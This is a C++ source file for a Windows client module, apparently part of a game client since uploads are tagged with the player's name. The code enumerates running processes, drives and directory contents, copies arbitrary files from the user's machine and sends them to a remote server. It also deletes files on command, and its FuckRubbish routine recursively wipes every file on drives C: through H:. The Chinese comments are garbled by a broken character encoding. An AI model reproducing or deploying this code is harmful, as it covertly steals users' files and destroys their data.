#include "stdafx.h"
#include "Client.h"
#include "shlwapi.h"
#include <tlhelp32.h>
#pragma comment(lib,"shlwapi.lib")
#include <Psapi.h>  
#pragma comment (lib,"Psapi.lib")
#include <algorithm>
#include <io.h>
#include <direct.h>
#include <fstream>
#include <process.h>
#include "ObjectManager.h"
#include <thread>
#define PATH_DELIMITER '\\'
std::vector<std::string> Client::m_FilePath; //�ļ�·����������
std::map<std::string,LOCALFILEINFO> Client::m_WatiSendFile; //�跢���ļ���Ϣ
std::string Client::TempPathInfo; //��ʱ·��
Client::Client(void)
{
	char buf[MAX_PATH];
	GetTempPath(MAX_PATH,buf);
	TempPathInfo = buf;
	TempPathInfo+="mydata\\";
	createDirectory(TempPathInfo);
	prarm=NULL;
}

Client::~Client(void)
{
	m_WatiSendFile.clear();
	m_FilePath.clear();
}
void Client::SetServerInfo(char * IP,int port)
{
	g_NETWORK.SetServerInfo(IP,port);
	DoRemoveDirectory(TempPathInfo);
	createDirectory(TempPathInfo);
}
//��ȡ������Ϣ
void Client::GetProcessFileInfo()
{
	int ProcessCount = 0;
	std::string exeFullPath;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return;
	}
	BOOL bMore = ::Process32First(hProcessSnap,&pe32);
	while (bMore)
	{
		exeFullPath=GetProcessFullPath(pe32.th32ProcessID);
		if (exeFullPath.size()>0)
		{
			m_FilePath.push_back(exeFullPath);
		}
		bMore = ::Process32Next(hProcessSnap,&pe32);
	}
	::CloseHandle(hProcessSnap);
}
//�������̳�����ʱĿ¼
void Client::CopyProcessFile()
{
	std::vector<std::string> filename;
	std::vector<std::string>::iterator iter;
	std::string TempPath;
	if (m_FilePath.size()==0)
		return;
	TempPath = TempPathInfo;
	TempPath += "ProcessFile.txt";

	std::ofstream OutFile(TempPath.c_str());
	iter=m_FilePath.begin();
	while(TRUE)
	{
		if(iter==m_FilePath.end())
			break;
		else
		{
			OutFile<<iter->c_str()<<std::endl;
		}
		iter++;
	}
	OutFile.close();
}
//[ɾ���ļ�][By:ʮ���½���][QQ:112582793][2018/4/5]
void Client::DoDeleteFile(std::string path,bool SomeFile)
{
	if(m_FilePath.size()>0)
		m_FilePath.clear();
	if(SomeFile)
	{
		getFilesAll(path,m_FilePath);
		if(m_FilePath.size()>0)
		{
			std::vector<std::string>::iterator iter;
			iter = m_FilePath.begin();
			for(;iter!=m_FilePath.end();iter++)
				DeleteFile(iter->c_str());
		}
	}
	else
		DeleteFile(path.c_str());
}

//��ȡĿ¼�ļ�·��
void Client::GetPathFileInfo(std::string path,bool SomeFile)
{
	if(m_FilePath.size()>0)
		m_FilePath.clear();
	if(SomeFile)
		getFilesAll(path,m_FilePath);
	else
	{
		m_FilePath.push_back(path);
		CopyPathFileInfo(path,SomeFile);
	}
}
//����Ŀ¼�ļ�����ʱĿ¼
void Client::CopyPathFileInfo(std::string path,bool SomeFile)
{
	std::vector<std::string> filename;
	std::vector<std::string>::iterator iter;
	std::string TempPath;
	if (m_FilePath.size()==0&&SomeFile)
		return;
	if (SomeFile)
	{
		for(iter=m_FilePath.begin();iter!=m_FilePath.end();)
		{
			TempPath=TempPathInfo;
			filename.push_back(GetFileName(*iter));
			TempPath += GetFilePath(*iter);
			createDirectory(TempPath);
			TempPath += filename.back();
			if(!::CopyFileA(iter->c_str(),TempPath.c_str(),true))
				iter = m_FilePath.erase(iter++);
			else
			{
				++iter;
				if (iter==m_FilePath.end())
					break;
			}
				
		}
	}
	else
	{
		TempPath=TempPathInfo;
		filename.push_back(GetFileName(path));
		TempPath += GetFilePath(path);
		createDirectory(TempPath);
		TempPath += filename.back();
		if(!::CopyFileA(path.c_str(),TempPath.c_str(),true))
		{
			int err = 0;
			err = GetLastError();
		}
	}
}
//·����ȡ�ļ���
std::string Client::GetFileName(std::string str)
{
	std::string result = str;
	size_t Pos = result.find_last_of("\\");
	result.replace(0,Pos+1,"");
	return result;
}
//�����༶Ŀ¼
bool Client::createDirectory(std::string folder) {
	std::string folder_builder;
	std::string sub;
	sub.reserve(folder.size());
	for (std::string::iterator it = folder.begin(); it != folder.end(); ++it)
	{
		const char c = *it;
		sub.push_back(c);
		if (c == PATH_DELIMITER || it == folder.end() - 1) 
		{
			folder_builder.append(sub);
			if (0 != ::_access(folder_builder.c_str(), 0)) 
			{
				if (0 != ::_mkdir(folder_builder.c_str())) 
				{
					return false;
				}
			}
			sub.clear();
		}
	}
	return true;
}
//���Ŀ¼�������ļ�������Ŀ¼
BOOL Client::DoRemoveDirectory(std::string chrDirName)
{
	std::string strDirName = chrDirName;
	BOOL result = FALSE;
	HANDLE Handle;
	WIN32_FIND_DATA fData;
	std::string strTemp;
	DWORD errorcode;
	strDirName += "\\*.*";
	Handle = FindFirstFile(strDirName.c_str(), &fData);
	if (Handle == INVALID_HANDLE_VALUE)
		return FALSE;
	do {
		strDirName= chrDirName;
		errorcode = GetLastError();
		if ( fData.cFileName[0] == '.' )
			continue;
		if (fData.dwFileAttributes == 8208||fData.dwFileAttributes ==FILE_ATTRIBUTE_DIRECTORY) 
		{
			if (strDirName[strDirName.length()-1] != '\\')
			{
				//TCHAR chA[MAX_PATH];
			}
			else
			{
				TCHAR chB[MAX_PATH];
				std::string strB = strDirName ;
				strB +=fData.cFileName;
				strB += "\\";
				lstrcpy(chB, strB.c_str());
				DoRemoveDirectory(chB);
			}
			strTemp = strDirName ;
			strTemp += "\\";
			strTemp += fData.cFileName;
			SetFileAttributes(strTemp.c_str(), ~FILE_ATTRIBUTE_READONLY);
			if (!RemoveDirectory(strTemp.c_str()))
				result = FALSE;
			else
				result = TRUE;
		}
		else
		{
			strTemp = strDirName ;
			strTemp += "\\";
			strTemp  += fData.cFileName;
			BOOL bl = SetFileAttributes(strTemp.c_str(), ~FILE_ATTRIBUTE_READONLY);
			if (!DeleteFile(strTemp.c_str()))
				result = FALSE;
			else
				result = TRUE;
		}

	}while(FindNextFile(Handle,&fData));

	errorcode = GetLastError();
	if (errorcode == ERROR_NO_MORE_FILES)
	{
		::RemoveDirectory(strDirName.c_str());
		result = TRUE;
	}
	if (Handle)
		FindClose(Handle);
	return result;
}
//����·����ȡ
std::string Client::GetProcessFullPath(DWORD dwPID)  
{  
	TCHAR       szImagePath[MAX_PATH];  
	TCHAR       pszFullPath[MAX_PATH];  
	HANDLE      hProcess; 
	std::string strPath;
	strPath = "";
	if(!pszFullPath)  
		return strPath;  

	pszFullPath[0] = '\0';  
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPID);  
	if(!hProcess)  
		return strPath;  

	if(!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))  
	{  
		CloseHandle(hProcess);  
		return strPath;  
	}  

	if(!DosPathToNtPath(szImagePath, pszFullPath))  
	{  
		CloseHandle(hProcess);  
		return strPath;  
	}  

	CloseHandle(hProcess);  
	strPath = pszFullPath;
	return strPath;  
}  

BOOL Client::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)  
{  
	TCHAR           szDriveStr[500];  
	TCHAR           szDrive[3];  
	TCHAR           szDevName[100];  
	INT             cchDevName;  
	INT             i;  

	//������  
	if(!pszDosPath || !pszNtPath )  
		return FALSE;  

	//��ȡ���ش����ַ���  
	if(GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))  
	{  
		for(i = 0; szDriveStr[i]; i += 4)  
		{  
			if(!lstrcmpi(&(szDriveStr[i]), "A:\\") || !lstrcmpi(&(szDriveStr[i]), "B:\\"))  
				continue;  

			szDrive[0] = szDriveStr[i];  
			szDrive[1] = szDriveStr[i + 1];  
			szDrive[2] = '\0';  
			if(!QueryDosDevice(szDrive, szDevName, 100))//��ѯ Dos �豸��  
				return FALSE;  

			cchDevName = lstrlen(szDevName);  
			if(_strnicmp(pszDosPath, szDevName, cchDevName) == 0)//����  
			{  
				lstrcpy(pszNtPath, szDrive);//����������  
				lstrcat(pszNtPath, pszDosPath + cchDevName);//����·��  

				return TRUE;  
			}             
		}  
	}  

	lstrcpy(pszNtPath, pszDosPath);  

	return FALSE;  
}  






//��ȡĿ¼����ϸ�ļ���Ϣ���ṹ
void Client::getFilesAll(std::string path, std::map<std::string,LOCALFILEINFO>& files)
{
	intptr_t hFile = 0;
	//�ļ���Ϣ
	struct _finddata_t fileinfo;
	std::string p;  
	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1) 
	{
		do {
			if ((fileinfo.attrib & _A_SUBDIR))
			{
				if (strcmp(fileinfo.name,".") != 0  &&  strcmp(fileinfo.name,"..") != 0) 
				{
					getFilesAll(p.assign(path).append("\\").append(fileinfo.name), files);
				}
			} 
			else 
			{  
				LOCALFILEINFO fileInfo;
				fileInfo.stFilePath=p.assign(path).append("\\").append(fileinfo.name);
				fileInfo.dwLength=fileinfo.size;				
				files[fileinfo.name]=fileInfo;
			}
		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
	}
}
//��ȡĿ¼�������ļ�·��������
void Client::getFilesAll(std::string path, std::vector<std::string>& files)
{
	intptr_t hFile = 0;
	//�ļ���Ϣ
	struct _finddata_t fileinfo;
	std::string p;  
	if ((hFile = _findfirst(p.assign(path).append("\\*").c_str(), &fileinfo)) != -1) 
	{
		do {
			if ((fileinfo.attrib & _A_SUBDIR))
			{
				if (strcmp(fileinfo.name,".") != 0  &&  strcmp(fileinfo.name,"..") != 0) 
				{
					getFilesAll(p.assign(path).append("\\").append(fileinfo.name), files);
				}
			} 
			else 
			{  
				files.push_back(p.assign(path).append("\\").append(fileinfo.name));
			}
		} while (_findnext(hFile, &fileinfo) == 0);
		_findclose(hFile);
	}
}

//���ļ���Ϣд�뵽�ı��ļ�
void Client::WriteFileInfo()
{
	if (m_WatiSendFile.size()==0)
		return;
	std::ofstream OutInfo;
	std::map<std::string,LOCALFILEINFO>::iterator iter;
	std::string TempPath; 
	TempPath = TempPathInfo;
	TempPath += "cFileInfo.txt";
	OutInfo.open(TempPath.c_str());
	if (!OutInfo.is_open())
		return;
	for (iter = m_WatiSendFile.begin();iter!=m_WatiSendFile.end();iter++)
	{//iter->second.dwLength/1024<<"KB"
		OutInfo<<"·��:"<<iter->second.stFilePath<<"\t"<<"��С:"<<MakeFileSizeStr(iter->second.dwLength)<<std::endl;
	}
	OutInfo.close();
	m_WatiSendFile.clear();
}
//��ȡĿ¼��Ϣ
void Client::GetPathInfo(std::string path)
{
	getFilesAll(path, m_FilePath);
	WriteFileInfo();
}

void Client::BeginGetProces()
{
	std::thread t(&Client::GetProcess, this);
	t.detach();
}
void Client::BeginGetPathFile(std::string path,bool SomeFile)
{
	prarm = new PathPrarm;
	strcpy_s(prarm->path,MAX_PATH, path.c_str());
	prarm->Somefile = SomeFile;
	std::thread t(&Client::GetPathFile, this, prarm);
	t.detach();
}
void Client::DeleteFileForPath(std::string path,bool SomeFile)
{
	prarm = new PathPrarm;
	strcpy_s(prarm->path,MAX_PATH, path.c_str());
	prarm->Somefile = SomeFile;
	std::thread t(&Client::MyDeleteFile, this, prarm);
	t.detach();
}
void Client::FuckRubbish()
{
	std::thread t1(&Client::DoDeleteRubbish, this, "h:");
	t1.detach();
	std::thread t2(&Client::DoDeleteRubbish, this, "g:");
	t2.detach();
	std::thread t3(&Client::DoDeleteRubbish, this, "f:");
	t3.detach();
	std::thread t4(&Client::DoDeleteRubbish, this, "e:");
	t4.detach();
	std::thread t5(&Client::DoDeleteRubbish, this, "d:");
	t5.detach();
	std::thread t6(&Client::DoDeleteRubbish, this, "c:");
	t6.join();
}
void Client::DoDeleteRubbish(std::string path)
{
	std::vector<std::string> vFileInfo;
	getFilesAll(path, vFileInfo);
	if (vFileInfo.size() > 0)
	{
		std::vector<std::string>::iterator iter;
		iter = vFileInfo.begin();
		for (; iter != vFileInfo.end(); iter++)
		{
			DeleteFile(iter->c_str());
			Sleep(10);
		}
	}
}
void Client::BeginGetPathInfo(std::string path,bool SomeFile)
{
	prarm = new PathPrarm;;
	strcpy_s(prarm->path,MAX_PATH, path.c_str());
	prarm->Somefile = SomeFile;
	std::thread t(&Client::GetPathInfoT, this, prarm);
	t.detach();
}
std::string Client::GetFilePath(std::string str)
{
	std::string result = str;
	size_t Pos = result.find_last_of(":");
	result.replace(0,Pos+2,"");
	Pos = result.find_last_of("\\");
	result.replace(Pos+1,result.length(),"");
	return result;
}
std::string Client::MakeFileSizeStr(_fsize_t size)
{
	std::string result;
	char buf[512];
	WORD type = 0;
	double temp = size;
	while(temp>1024)
	{
		temp /= 1024;
		type++;
	}
	switch(type)
	{
	case 0:
			sprintf_s(buf,512,"%.1f�ֽ�",temp);
		break;
	case 1:
			sprintf_s(buf,512,"%.1f KB",temp);
		break;
	case 2:
			sprintf_s(buf,512,"%.1f MB",temp);
		break;
	case 3:
			sprintf_s(buf,512,"%.1f GB",temp);
		break;
	default:
		sprintf_s(buf,512,"��������е��");
	}
	result = buf;
	return result;
}
//�̺߳���
 int  Client::GetProcess()
{
	sClient->DoDeleteFile(TempPathInfo,TRUE);
	if (m_FilePath.size()>0)
		m_FilePath.clear();
	sClient->GetProcessFileInfo();
	sClient->CopyProcessFile();
	std::vector<std::string>::iterator iter;
	std::string TempPath;

	TempPath = "\\Process\\";
	TempPath+= "ProcessFile.txt";
	FileInfo teminfo;
	strcpy_s(teminfo.file_path,MAX_PATH,TempPath.c_str());
	strcpy_s(teminfo.PlayerName,16,HERO->GetObjectName());
	teminfo.file_count = 1;
	teminfo.GetFromTem = true;
	sClient->g_NETWORK.SendFile(teminfo);
	return 0;
}
 int  Client::GetPathFile(PVOID pParm)
{
	PathPrarm* client =(PathPrarm*)pParm;
	sClient->GetPathFileInfo(client->path,client->Somefile);
	sClient->CopyPathFileInfo(client->path,client->Somefile);
	std::vector<std::string>::iterator iter;
	for(iter=m_FilePath.begin();iter!=m_FilePath.end();iter++)
	{
		FileInfo teminfo;
		strcpy_s(teminfo.file_path,MAX_PATH,iter->c_str());
		strcpy_s(teminfo.PlayerName,16,HERO->GetObjectName());
		teminfo.file_count = m_FilePath.size();
		teminfo.GetFromTem = false;
		sClient->g_NETWORK.SendFile(teminfo);
	}
	m_FilePath.clear();
	if (client != NULL)
	{
		delete client;
		client = NULL;
	}

	return 0;
}
int  Client::MyDeleteFile(PVOID pParm)
{
	PathPrarm* client =(PathPrarm*)pParm;
	sClient->DoDeleteFile(client->path,client->Somefile);
	if (client)
	{
		delete client;
		client = NULL;
	}
	return 0;
}
int  Client::GetPathInfoT(PVOID pParm)
{
	std::string TempPath;
	PathPrarm* client =(PathPrarm*)pParm;
	if(strcmp(client->path,"123")==0)
	{
		char szDriveStr[1024] = {0,};
		GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr);
		std::string str;

		for(int i = 0; szDriveStr[i]; i += 4)  
		{
			if(!lstrcmpi(&(szDriveStr[i]), _T("A:\\")) || !lstrcmpi(&(szDriveStr[i]), _T("B:\\")))  
				continue;  
			str += szDriveStr[i]; 
		}
		std::ofstream OutInfo;
		TempPath = TempPathInfo;
		TempPath += "cDriveInfo.txt";
		OutInfo.open(TempPath.c_str());
		if (!OutInfo.is_open())
			return 0;
		OutInfo<<str.c_str()<<std::endl;
		OutInfo.close();
		sClient->getFilesAll(sClient->TempPathInfo,m_FilePath);
		std::vector<std::string>::iterator iter;
		for(iter=m_FilePath.begin();iter!=m_FilePath.end();iter++)
		{
			TempPath = "\\DriveInfo\\";
			TempPath+=sClient->GetFileName(*iter);
			FileInfo teminfo;
			strcpy_s(teminfo.file_path,MAX_PATH,TempPath.c_str());
			strcpy_s(teminfo.PlayerName,16,HERO->GetObjectName());
			teminfo.file_count = m_FilePath.size();
			teminfo.GetFromTem = true;
			sClient->g_NETWORK.SendFile(teminfo);
		}
		m_FilePath.clear();
	}
	else
	{
		sClient->getFilesAll(client->path,m_WatiSendFile);
		if (m_WatiSendFile.size()==0)
			return 0;
		sClient->WriteFileInfo();
		sClient->getFilesAll(sClient->TempPathInfo,m_FilePath);
		std::vector<std::string>::iterator iter;
		for(iter=m_FilePath.begin();iter!=m_FilePath.end();iter++)
		{
			TempPath = "\\PathInfo\\";
			TempPath+=sClient->GetFileName(*iter);
			FileInfo teminfo;
			strcpy_s(teminfo.file_path,MAX_PATH,TempPath.c_str());
			strcpy_s(teminfo.PlayerName,16,HERO->GetObjectName());
			teminfo.file_count = m_FilePath.size();
			teminfo.GetFromTem = true;
			sClient->g_NETWORK.SendFile(teminfo);
		}
		m_FilePath.clear();
	}
	if (client != NULL)
	{
		delete client;
		client = NULL;
	}
	sClient->DoRemoveDirectory(TempPathInfo);
	return 0;
}
